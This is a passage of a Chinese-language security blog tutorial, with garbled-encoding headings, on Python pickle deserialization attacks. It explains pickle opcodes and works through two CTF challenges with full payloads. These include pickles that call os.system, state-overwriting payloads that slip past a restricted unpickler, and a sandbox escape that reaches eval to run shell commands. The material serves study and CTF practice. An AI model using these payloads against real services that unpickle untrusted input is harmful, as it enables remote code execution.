class="comment"># call __setstate__ or __dict__.update()</span></span><br><span class="line">GLOBAL         = <span class="string">b'c'</span>   <span class="comment"># push self.find_class(modname, name); 2 string args</span></span><br><span class="line">DICT           = <span class="string">b'd'</span>   <span class="comment"># build a dict from stack items</span></span><br><span class="line">EMPTY_DICT     = <span class="string">b'&#125;'</span>   <span class="comment"># push empty dict</span></span><br><span class="line">APPENDS        = <span class="string">b'e'</span>   <span class="comment"># extend list on stack by topmost stack slice</span></span><br><span class="line">GET            = <span class="string">b'g'</span>   <span class="comment"># push item from memo on stack; index is string arg</span></span><br><span class="line">BINGET         = <span class="string">b'h'</span>   <span class="comment">#   "    "    "    "   "   "  ;   "    " 1-byte arg</span></span><br><span class="line">INST           = <span class="string">b'i'</span>   <span class="comment"># build &amp; push class instance</span></span><br><span class="line">LONG_BINGET    = <span class="string">b'j'</span>   <span class="comment"># push item from memo on stack; index is 4-byte arg</span></span><br><span class="line">LIST           = <span class="string">b'l'</span>   <span class="comment"># build list from topmost stack items</span></span><br><span class="line">EMPTY_LIST     = <span class="string">b']'</span>   <span class="comment"># push empty list</span></span><br><span class="line">OBJ            = <span class="string">b'o'</span>   <span class="comment"># build &amp; push class instance</span></span><br><span class="line">PUT            = <span class="string">b'p'</span>   <span class="comment"># store stack top in memo; index is string arg</span></span><br><span class="line">BINPUT         = <span class="string">b'q'</span>   <span class="comment">#   "     "    "   "   " ;   "    " 1-byte arg</span></span><br><span class="line">LONG_BINPUT    = <span class="string">b'r'</span>   <span class="comment">#   "     "    "   "   " ;   "    " 4-byte arg</span></span><br><span class="line">SETITEM        = <span class="string">b's'</span>   <span class="comment"># add key+value pair to dict</span></span><br><span class="line">TUPLE          = <span class="string">b't'</span>   <span class="comment"># build tuple from topmost stack items</span></span><br><span class="line">EMPTY_TUPLE    = <span class="string">b')'</span>   <span class="comment"># push empty tuple</span></span><br><span class="line">SETITEMS       = <span class="string">b'u'</span>   <span class="comment"># modify dict by adding topmost key+value pairs</span></span><br><span class="line">BINFLOAT       = <span class="string">b'G'</span>   <span class="comment"># push float; arg is 8-byte float encoding</span></span><br><span class="line"></span><br><span class="line">TRUE           = <span class="string">b'I01\n'</span>  <span class="comment"># not an opcode; see INT docs in pickletools.py</span></span><br><span class="line">FALSE          = <span class="string">b'I00\n'</span>  <span class="comment"># not an opcode; see INT docs in pickletools.py</span></span><br></pre></td></tr></table></figure><h2 id="å¦‚ä½•ç”Ÿæˆ-pickleï¼Ÿ"><a href="#å¦‚ä½•ç”Ÿæˆ-pickleï¼Ÿ" class="headerlink" title="å¦‚ä½•ç”Ÿæˆ pickleï¼Ÿ"></a>å¦‚ä½•ç”Ÿæˆ pickleï¼Ÿ</h2><h3 id="æ‰‹å†™"><a href="#æ‰‹å†™" class="headerlink" title="æ‰‹å†™"></a>æ‰‹å†™</h3><p>åŸºæœ¬æ¨¡å¼ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c<span class="tag">&lt;<span class="name">module</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">callable</span>&gt;</span></span><br><span class="line">(<span class="tag">&lt;<span class="name">args</span>&gt;</span></span><br><span class="line">tR</span><br></pre></td></tr></table></figure><p>çœ‹ä¸ªå°ä¾‹å­ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">cos</span><br><span class="line">system</span><br><span class="line">(S<span class="string">'ls'</span></span><br><span class="line">tR.</span><br><span class="line"></span><br><span class="line">&lt;=&gt; __import__('os').system(*('ls',))</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ†è§£ä¸€ä¸‹ï¼š</span></span><br><span class="line">cos</span><br><span class="line">system  =&gt;  å¼•å…¥ systemï¼Œå¹¶å°†å‡½æ•°æ·»åŠ åˆ° stack</span><br><span class="line"></span><br><span class="line">(S'ls'=&gt;  æŠŠå½“å‰ stack å­˜åˆ° metastackï¼Œæ¸…ç©º stackï¼Œå†å°† 'ls' å‹å…¥ stack</span><br><span class="line">t=&gt;  stack ä¸­çš„å€¼å¼¹å‡ºå¹¶è½¬ä¸º tupleï¼ŒæŠŠ metastack è¿˜åŸåˆ° stackï¼Œå†å°† tuple å‹å…¥ stack</span><br><span class="line"><span class="comment"># ç®€å•æ¥è¯´ï¼Œ(,t ä¹‹é—´çš„å†…å®¹å½¢æˆäº†ä¸€ä¸ª tupleï¼Œstack ç›®å‰æ˜¯ [&lt;built-in function system&gt;, ('ls',)]</span></span><br><span class="line">R =&gt;  system(*('ls',))</span><br><span class="line">.=&gt;  ç»“æŸï¼Œè¿”å›å½“å‰æ ˆé¡¶å…ƒç´ </span><br></pre></td></tr></table></figure><h3 id="reduce"><a href="#reduce" class="headerlink" title="_reduce_"></a>_<em>reduce_</em></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os, pickle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">'ls'</span>,))</span><br><span class="line">    </span><br><span class="line">print(pickle.dumps(Test(), protocol=<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">b'cnt\nsystem\np0\n(Vls\np1\ntp2\nRp3\n.'</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>ç¼ºç‚¹ï¼šåªèƒ½æ‰§è¡Œå•ä¸€çš„å‡½æ•°ï¼Œå¾ˆéš¾æ„é€ å¤æ‚çš„æ“ä½œï¼Œä¸‹æ–‡çš„è®²è§£éƒ½æ˜¯ç›´æ¥å†™ã€‚</p><h2 id="å®ä¾‹åˆ†æ"><a href="#å®ä¾‹åˆ†æ" class="headerlink" title="å®ä¾‹åˆ†æ"></a>å®ä¾‹åˆ†æ</h2><h3 id="SUCTF-2019-Guess-game"><a href="#SUCTF-2019-Guess-game" class="headerlink" title="SUCTF 2019 Guess_game"></a>SUCTF 2019 Guess_game</h3><blockquote><p>å®Œæ•´æºç ï¼š<a href="https://github.com/team-su/SUCTF-2019/tree/master/Misc/guess_game" target="_blank" rel="noopener">https://github.com/team-su/SUCTF-2019/tree/master/Misc/guess_game</a></p></blockquote><p>çŒœæ•°æ¸¸æˆï¼Œ10 ä»¥å†…çš„æ•°å­—ï¼ŒçŒœå¯¹åæ¬¡å°±è¿”å› flagã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># file: Ticket.py</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ticket</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, number)</span>:</span></span><br><span class="line">        self.number = number</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__eq__</span><span class="params">(self, other)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> type(self) == type(other) <span class="keyword">and</span> self.number == other.number:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_valid</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">assert</span> type(self.number) == int</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> number_range &gt;= self.number &gt;= <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">       </span><br><span class="line"><span class="comment"># file: game_client.py</span></span><br><span class="line">number = input(<span class="string">'Input the number you guess\n&gt; '</span>)</span><br><span class="line">ticket = Ticket(number)</span><br><span class="line">ticket = pickle.dumps(ticket)</span><br><span class="line">writer.write(pack_length(len(ticket)))</span><br><span class="line">writer.write(ticket)</span><br></pre></td></tr></table></figure><p>client ç«¯æ¥æ”¶æ•°å­—è¾“å…¥ï¼Œç”Ÿæˆçš„ Ticket å¯¹è±¡åºåˆ—åŒ–åå‘é€ç»™ server ç«¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># file: game_server.py æœ‰åˆ å‡</span></span><br><span class="line"><span class="keyword">from</span> guess_game.Ticket <span class="keyword">import</span> Ticket</span><br><span class="line"><span class="keyword">from</span> guess_game.RestrictedUnpickler <span class="keyword">import</span> restricted_loads</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> unpack</span><br><span class="line"><span class="keyword">from</span> guess_game <span class="keyword">import</span> game</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> game.finished():</span><br><span class="line">ticket = stdin_read(length)</span><br><span class="line">    ticket = restricted_loads(ticket)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> type(ticket) == Ticket</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> ticket.is_valid():</span><br><span class="line">        print(<span class="string">'The number is invalid.'</span>)</span><br><span class="line">        game.next_game(Ticket(<span class="number">-1</span>))</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    win = game.next_game(ticket)</span><br><span class="line">    <span class="keyword">if</span> win:</span><br><span class="line">        text = <span class="string">"Congratulations, you get the right number!"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        text = <span class="string">"Wrong number, better luck next time."</span></span><br><span class="line">    print(text)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> game.is_win():</span><br><span class="line">        text = <span class="string">"Game over! You win all the rounds, here is your flag %s"</span> % flag</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        text = <span class="string">"Game over! You got %d/%d."</span> % (game.win_count, game.round_count)</span><br><span class="line">    print(text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># file: RestrictedUnpickler.py  å¯¹å¼•å…¥çš„æ¨¡å—è¿›è¡Œæ£€æµ‹</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span><span class="params">(pickle.Unpickler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></span><br><span class="line">        <span class="comment"># Only allow safe classes</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"guess_game"</span> == module[<span class="number">0</span>:<span class="number">10</span>] <span class="keyword">and</span> <span class="string">"__"</span> <span class="keyword">not</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">return</span> getattr(sys.modules[module], name)</span><br><span class="line">        <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">"global '%s.%s' is forbidden"</span> % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">restricted_loads</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="string">"""Helper function analogous to pickle.loads()."""</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br></pre></td></tr></table></figure><p>server ç«¯å°†æ¥æ”¶åˆ°çš„æ•°æ®è¿›è¡Œååºåˆ—ï¼Œè¿™é‡Œä¸å¸¸è§„çš„ <code>pickle.loads</code> ä¸åŒï¼Œé‡‡ç”¨çš„æ˜¯ Python æä¾›çš„<a href="https://docs.python.org/zh-cn/3/library/pickle.html?highlight=__reduce#restricting-globals" target="_blank" rel="noopener">å®‰å…¨æªæ–½</a>ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¯¼å…¥çš„æ¨¡å—åªèƒ½ä»¥ <code>guess_name</code> å¼€å¤´ï¼Œå¹¶ä¸”åç§°é‡Œä¸èƒ½å«æœ‰ <code>__</code>ã€‚</p><p>æœ€åˆçš„æƒ³æ³•è¿˜æ˜¯æƒ³æ‰§è¡Œå‘½ä»¤ï¼Œåªæ˜¯åšé¢˜çš„è¯å®Œå…¨ä¸éœ€è¦è¿™ä¹ˆæŠ˜è…¾ï¼Œå…ˆæ¥çœ‹ä¸€ä¸‹åˆ¤èµ¢è§„åˆ™ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># file: Game.py</span></span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> guess_game.Ticket <span class="keyword">import</span> Ticket</span><br><span class="line"><span class="keyword">from</span> guess_game <span class="keyword">import</span> max_round, number_range</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        number = randint(<span class="number">0</span>, number_range)</span><br><span class="line">        self.curr_ticket = Ticket(number)</span><br><span class="line">        self.round_count = <span class="number">0</span></span><br><span class="line">        self.win_count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next_game</span><span class="params">(self, ticket)</span>:</span></span><br><span class="line">        win = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> self.curr_ticket == ticket:</span><br><span class="line">            self.win_count += <span class="number">1</span></span><br><span class="line">            win = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        number = randint(<span class="number">0</span>, number_range)</span><br><span class="line">        self.curr_ticket = Ticket(number)</span><br><span class="line">        self.round_count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> win</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">finished</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.round_count &gt;= max_round</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_win</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.win_count == max_round</span><br></pre></td></tr></table></figure><p>åªè¦èƒ½æ§åˆ¶ä½ <code>curr_ticket</code>ï¼Œæ¯å±€å°±èƒ½ç¨³èµ¢ï¼Œæˆ–è€…ç›´æ¥å°† <code>win_count</code> è®¾ä¸º 10ï¼Œèƒ½å®ç°å—ï¼Ÿ</p><p><strong>å…ˆè¯•è¯•è¦†ç›– <code>win_count</code> å’Œ <code>round_count</code></strong>ã€‚æ¢å¥è¯æ¥è¯´ï¼Œå°±æ˜¯éœ€è¦åœ¨ååºåˆ—åŒ– Ticket å¯¹è±¡å‰æ‰§è¡Œï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> guess_game <span class="keyword">import</span> game  <span class="comment"># __init__.py  game = Game()</span></span><br><span class="line">game.round_count = <span class="number">10</span></span><br><span class="line">game.win_count = <span class="number">10</span></span><br></pre></td></tr></table></figure><p>pickle é‡Œå¹¶ä¸èƒ½ç›´æ¥ç”¨ç­‰å·èµ‹å€¼ï¼Œä½†æœ‰å¯¹åº”çš„æŒ‡ä»¤ç”¨æ¥æ”¹å˜å±æ€§ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BUILD = <span class="string">b'b'</span>   <span class="comment"># call __setstate__ or __dict__.update()</span></span><br><span class="line"><span class="comment"># å…·ä½“å®ç°åœ¨ pickle.py çš„ 1546 è¡Œ</span></span><br></pre></td></tr></table></figure><p>å¼€å§‹æ„é€ </p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cguess_game</span><br><span class="line">game</span><br><span class="line">&#125;S'round_count'</span><br><span class="line">I10</span><br><span class="line">sS'win_count'</span><br><span class="line">I10</span><br><span class="line">sb</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œ<code>}</code> æ˜¯å¾€ stack ä¸­å‹å…¥ä¸€ä¸ªç©º dictï¼Œ<code>s</code> æ˜¯å°†é”®å€¼å¯¹æ’å…¥åˆ° dictã€‚</p><p>æµ‹è¯•ä¸€ä¸‹æ•ˆæœï¼ŒæˆåŠŸã€‚</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g7yxg3sbn9j20pj062wew.jpg" alt="image.png"></p><p>åˆ°è¿™å°±åšå®Œäº†å—ï¼Ÿä¸ï¼Œè¿˜æœ‰ä¸ªå°éªŒè¯ï¼Œ<code>assert type(ticket) == Ticket</code>ã€‚</p><p>ä¹‹å‰æåˆ°è¿‡ï¼Œ<code>pickle</code> åºåˆ—æµæ‰§è¡Œå®Œåå°†æŠŠæ ˆé¡¶çš„å€¼è¿”å›ï¼Œé‚£ç»“å°¾å†ç•™ä¸€ä¸ª <code>Ticket</code> çš„å¯¹è±¡å°±å¥½äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ticket = Ticket(<span class="number">6</span>)</span><br><span class="line">res = pickle.dumps(ticket)  <span class="comment"># è¿™é‡Œä¸èƒ½å†ç”¨ 0 å·åè®®ï¼Œå¦åˆ™ä¼šå‡ºç° ccopy_reg\n_reconstructor</span></span><br><span class="line">print(res)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">\x80\x03cguess_game.Ticket\nTicket\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00numberq\x03K\x06sb.</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>æœ€ç»ˆ payloadï¼š</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cguess_game<span class="symbol">\n</span>game<span class="symbol">\n</span>&#125;S"win_count"<span class="symbol">\n</span>I10<span class="symbol">\n</span>sS"round_count"<span class="symbol">\n</span>I9<span class="symbol">\n</span>sbcguess_game.Ticket<span class="symbol">\n</span>Ticket<span class="symbol">\n</span>q<span class="symbol">\x</span>00)<span class="symbol">\x</span>81q<span class="symbol">\x</span>01&#125;q<span class="symbol">\x</span>02X<span class="symbol">\x</span>06<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00numberq<span class="symbol">\x</span>03K<span class="symbol">\x</span>06sb.</span><br></pre></td></tr></table></figure><p><strong>å°è¯•è¦†ç›–æ‰ <code>current_ticket</code></strong>ï¼š</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cguess_game<span class="symbol">\n</span></span><br><span class="line">game</span><br><span class="line">&#125;S'curr_ticket'</span><br><span class="line">cguess_game.Ticket<span class="symbol">\n</span>Ticket<span class="symbol">\n</span>q<span class="symbol">\x</span>00)<span class="symbol">\x</span>81q<span class="symbol">\x</span>01&#125;q<span class="symbol">\x</span>02X<span class="symbol">\x</span>06<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00numberq<span class="symbol">\x</span>03K<span class="symbol">\x</span>06sbp0</span><br><span class="line">sbg0</span><br><span class="line">.</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç”¨äº†ä¸€ä¸‹ memoï¼Œå­˜å‚¨äº† ticket å¯¹è±¡ï¼Œå†æ‹¿å‡ºæ¥æ”¾åˆ°æ ˆé¡¶ã€‚</p><p>æœ€ç»ˆ payloadï¼š</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cguess_game<span class="symbol">\n</span>game<span class="symbol">\n</span>&#125;S'curr_ticket'<span class="symbol">\n</span>cguess_game.Ticket<span class="symbol">\n</span>Ticket<span class="symbol">\n</span>q<span class="symbol">\x</span>00)<span class="symbol">\x</span>81q<span class="symbol">\x</span>01&#125;q<span class="symbol">\x</span>02X<span class="symbol">\x</span>06<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00numberq<span class="symbol">\x</span>03K<span class="symbol">\x</span>07sbp0<span class="symbol">\n</span>sbg0<span class="symbol">\n</span>.</span><br></pre></td></tr></table></figure><h3 id="Code-Breaking-2018-picklecode"><a href="#Code-Breaking-2018-picklecode" class="headerlink" title="Code-Breaking 2018 picklecode"></a>Code-Breaking 2018 picklecode</h3><blockquote><p>å®Œæ•´æºç ï¼š <a href="https://github.com/phith0n/code-breaking/blob/master/2018/picklecode" target="_blank" rel="noopener">https://github.com/phith0n/code-breaking/blob/master/2018/picklecode</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"></span><br><span class="line">__all__ = (<span class="string">'PickleSerializer'</span>, )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span><span class="params">(pickle.Unpickler)</span>:</span></span><br><span class="line">    blacklist = &#123;<span class="string">'eval'</span>, <span class="string">'exec'</span>, <span class="string">'execfile'</span>, <span class="string">'compile'</span>, <span class="string">'open'</span>, <span class="string">'input'</span>, <span class="string">'__import__'</span>, <span class="string">'exit'</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></span><br><span class="line">        <span class="comment"># Only allow safe classes from builtins.</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">"builtins"</span> <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> self.blacklist:</span><br><span class="line">            <span class="keyword">return</span> getattr(builtins, name)</span><br><span class="line">        <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">"global '%s.%s' is forbidden"</span> %</span><br><span class="line">                                     (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PickleSerializer</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dumps</span><span class="params">(self, obj)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> pickle.dumps(obj)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">loads</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> isinstance(data, str):</span><br><span class="line">                <span class="keyword">raise</span> TypeError(<span class="string">"Can't load pickle from unicode string"</span>)</span><br><span class="line">            file = io.BytesIO(data)</span><br><span class="line">            <span class="keyword">return</span> RestrictedUnpickler(file,</span><br><span class="line">                              encoding=<span class="string">'ASCII'</span>, errors=<span class="string">'strict'</span>).load()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> &#123;&#125;</span><br></pre></td></tr></table></figure><p>è¿™åªæ˜¯åŸé¢˜çš„ä¸€éƒ¨åˆ†ï¼Œé‡ç‚¹å…³æ³¨ä¸‹è¿™ä¸ªæ²™ç®±å¦‚ä½•é€ƒé€¸ã€‚å…ˆçœ‹ä¸ªä¸œè¥¿ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>getattr(globals()[<span class="string">'__builtins__'</span>], <span class="string">'eval'</span>)</span><br><span class="line">&lt;built-<span class="keyword">in</span> function eval&gt;</span><br><span class="line"></span><br><span class="line">&lt;=&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>getattr(dict.get(globals(), <span class="string">'__builtins__'</span>), <span class="string">'eval'</span>)</span><br><span class="line">&lt;built-<span class="keyword">in</span> function eval&gt;</span><br></pre></td></tr></table></figure><p><code>getattr</code> å’Œ <code>globals</code> å¹¶æ²¡æœ‰è¢«ç¦ï¼Œé‚£å°±å°è¯•å†™ pickle å§ã€‚</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cbuiltins</span><br><span class="line">getattr</span><br><span class="line">(<span class="name">cbuiltins</span></span><br><span class="line">dict</span><br><span class="line">S'get'</span><br><span class="line">tRp100</span><br><span class="line">(<span class="name">cbuiltins</span></span><br><span class="line">globals</span><br><span class="line">(<span class="name">tRS</span>'__builtins__'</span><br><span class="line">tRp101</span><br><span class="line"><span class="number">0</span>g100</span><br><span class="line">(<span class="name">g101</span></span><br><span class="line">S'eval'</span><br><span class="line">tR(<span class="name">S</span>'__import__(<span class="string">"os"</span>).system(<span class="string">"dir"</span>)'</span><br><span class="line">tR.</span><br></pre></td></tr></table></figure><p>PSï¼šæˆ‘çš„ç¯å¢ƒæ˜¯ 